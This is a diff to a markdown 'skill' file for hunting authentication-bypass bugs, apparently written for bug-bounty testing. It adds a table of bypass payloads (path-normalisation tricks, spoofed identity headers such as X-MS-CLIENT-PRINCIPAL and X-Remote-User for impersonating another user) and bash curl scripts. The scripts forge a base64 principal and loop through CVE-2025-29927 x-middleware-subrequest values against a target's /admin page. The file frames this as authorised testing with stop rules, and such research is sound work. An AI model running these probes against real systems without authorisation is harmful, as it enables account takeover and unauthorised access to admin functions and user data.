@@ -1,6 +1,6 @@
 ---
 name: hunt-auth-bypass
-description: Hunting skill for auth bypass vulnerabilities. Built from 12 public bug bounty reports across SAML XSW / parser-differential (GitHub Enterprise CVE-2025-25291/25292), SAML signature stripping (Uber, Rocket.Chat, samlify CVE-2025-47949), SAML domain enforcement bypass via control characters (HackerOne 2024), partner-portal cross-IdP assertion reuse (Slack), WordPress XMLRPC bypassing SSO (Uber), JWT alg-confusion HS256/RS256 (Jitsi), JWT signature-validation skip (Linktree, Newspack), and token-audience confusion (Argo CD CVE-2023-22482). Use when hunting auth bypass — see the Legacy-Protocol Matrix for branded-UI vs legacy-endpoint patterns.
+description: Hunting skill for auth bypass vulnerabilities. Built from 12 public bug bounty reports across SAML XSW / parser-differential (GitHub Enterprise CVE-2025-25291/25292), SAML signature stripping (Uber, Rocket.Chat, samlify CVE-2025-47949), SAML domain enforcement bypass via control characters (HackerOne 2024), partner-portal cross-IdP assertion reuse (Slack), WordPress XMLRPC bypassing SSO (Uber), JWT alg-confusion HS256/RS256 (Jitsi), JWT signature-validation skip (Linktree, Newspack), and token-audience confusion (Argo CD CVE-2023-22482). Also identity-header spoofing (Easy Auth X-MS-CLIENT-PRINCIPAL, IAP, Cloudflare Access, X-Remote-User) when the origin is reachable without the proxy. Use when hunting auth bypass — see the Legacy-Protocol Matrix for branded-UI vs legacy-endpoint patterns.
 sources: github, hackerone_public, github_security_lab, projectdiscovery_research
 report_count: 12
 ---
@@ -36,12 +36,13 @@ Protected resource `P` (expect 401/302). Replay until body contains an **auth-on
 
 | Class | Probe |
 |---|---|
-| Path normalize | `//P` `/./P` `/P/` `/P%20` `/P%09` `/P;` `/P..;/ ` `/P%2e%2e/` `/%2e%2e/P` |
+| Path normalize | `//P` `/./P` `/P/` `/P%20` `/P%09` `/P;` `/P..;/` `/P%2e%2e/` `/%2e%2e/P` `/P/.` `/P::$DATA` |
 | Case / encoding | `/Admin` `/ADMIN` `%2fP` double-encode, Unicode NFC/NFKC |
 | Suffix / alt parser | `/P.json` `/P.html` `/P;jsessionid=x` `/P%00` `/P%0d%0a` |
 | Header override | `X-Original-URL: /P` `X-Rewrite-URL` `X-Forwarded-Prefix` `X-Forwarded-For: 127.0.0.1` |
+| Identity header (IAP / Easy Auth / Access) | Origin reachable **without** the proxy rewriting headers: `X-Remote-User`, `X-Forwarded-User`, `X-Authenticated-User`, `X-Auth-Request-Email`, `Cf-Access-Authenticated-User-Email`, `X-Goog-Authenticated-User-Email`, `X-Amzn-Oidc-Identity`. Azure Easy Auth: `X-MS-CLIENT-PRINCIPAL` (base64 JSON) + `X-MS-CLIENT-PRINCIPAL-NAME`. Spoof **B’s** identity; body must gain B’s unique marker. A proxy that strips/overwrites the header is a miss — try the origin IP / non-Access host once |
 | Method | GET vs POST vs HEAD vs OPTIONS; `_method=`; `X-HTTP-Method-Override` |
-| Next.js middleware | `x-middleware-subrequest: middleware` (and nested `middleware:middleware:…`) — CVE-2025-29927 class; any middleware-gated route |
+| Next.js middleware | CVE-2025-29927. Header `x-middleware-subrequest`. Try, in order, `pages/_middleware` (pre-12.2), `middleware`, `src/middleware`, then five repeats: `middleware:middleware:middleware:middleware:middleware` and `src/middleware:src/middleware:src/middleware:src/middleware:src/middleware`. Patched Next ignores the header — a status change is not the bug |
 | Spring / proxy | `;` in path, `..;` `/.%2e/` — edge ACL vs app decode mismatch |
 | Authn skip | Drop cookie; empty `Authorization`; `Authorization: Bearer null` / `undefined` / `0`; Basic `Og==` (`:`) |
 | Array / JSON | `password[]=`  `{"password":["x"]}`  `{"user":{"$gt":""}}` (`hunt-nosqli`) |
@@ -49,11 +50,27 @@ Protected resource `P` (expect 401/302). Replay until body contains an **auth-on
 | Host / cache | `X-Forwarded-Host` on login (`hunt-host-header`) |
 
 ```bash
-# Example: middleware-style skip on a login-gated page
-curl -s -o /tmp/p -w "%{http_code} %{size_download}\n" https://$TARGET/admin
-curl -s -o /tmp/q -w "%{http_code} %{size_download}\n" \
-  -H 'x-middleware-subrequest: middleware' https://$TARGET/admin
-diff /tmp/p /tmp/q   # body must gain an identity/admin marker, not just status
+# Identity header: only when the app (not the edge) trusts it. Body-diff vs no header.
+PRINC=$(printf '{"auth_typ":"aad","claims":[{"typ":"preferred_username","val":"%s"}]}' "$B_EMAIL" | base64 -w0)
+curl -s -o /tmp/id0 "https://$TARGET/api/me"
+curl -s -o /tmp/id1 -H "X-MS-CLIENT-PRINCIPAL: $PRINC" -H "X-Remote-User: $B_EMAIL" \
+  -H "X-Auth-Request-Email: $B_EMAIL" "https://$TARGET/api/me"
+diff -q /tmp/id0 /tmp/id1 || echo "DIFF — replay one header at a time, confirm B marker, stop"
+
+# Middleware skip: body must gain an auth-only marker. Status alone is not the bug.
+# Patched Next.js ignores x-middleware-subrequest — stop when every diff is empty.
+curl -s -o /tmp/p -w "%{http_code} %{size_download}\n" "https://$TARGET/admin"
+for H in \
+  pages/_middleware \
+  middleware \
+  src/middleware \
+  middleware:middleware:middleware:middleware:middleware \
+  src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
+do
+  curl -s -o /tmp/q -w "%{http_code} %{size_download}\n" \
+    -H "x-middleware-subrequest: $H" "https://$TARGET/admin"
+  diff -q /tmp/p /tmp/q || echo "DIFF $H"
+done
 ```
 
 ## Legacy-protocol matrix (branded UI ≠ only gate)
@@ -102,6 +119,7 @@ router.get('/admin/export', getExport);   // missing
 | Legacy native-cred + no MFA | Your account proves SSO skip; stuffing is **out of rails** | Authn policy bypass |
 | Path/header skip | `hunt-idor` on `/v1/users/{id}` | Unauth PII |
 | JWT `aud` skip | Token from service A on API B | Cross-app impersonation |
+| Identity header on a reachable origin | Session as B / admin without IdP | Authn skip (`hunt-ato`) |
 | Partner cookie `Domain=.t.com` | Admin host trusts it | Trust-boundary jump |
 | SAML XSW | `hunt-ato` | Admin ATO |
 | BFLA export | IDOR ids inside export | Tenant dump — one extra row, stop |
